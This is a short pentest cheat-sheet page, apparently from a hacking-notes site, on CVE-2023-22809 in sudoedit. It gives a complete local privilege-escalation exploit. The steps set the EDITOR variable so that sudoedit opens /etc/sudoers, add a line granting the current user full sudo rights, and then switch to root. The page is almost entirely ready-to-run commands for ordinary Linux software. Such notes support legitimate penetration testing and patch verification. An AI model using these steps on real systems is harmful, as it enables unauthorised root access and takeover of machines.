---
title: Sudoedit Privilege Escalation
description: Sudoedit is vulnerable to privilege escalation.
tags:
    - Privilege Escalation
refs:
    - https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf
date: 2023-03-29
draft: false
---

## Investigation

```bash
sudo -l

(root) sudoedit /opt/example.txt
```

If we can execute sudoedit command as root, we might be able to escalate the privileges with some version.

<br />

## Exploitation ([CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf))

```bash
export EDITOR="vim -- /etc/sudoers"
sudoedit /opt/example.txt
```

In vim editor, add the following line in **`/etc/sudoers`**.  
Assume the current username is “john”

```bash
john ALL=(ALL:ALL) ALL
```

After that, we can escalate to root privilege.

```bash
sudo su root
```
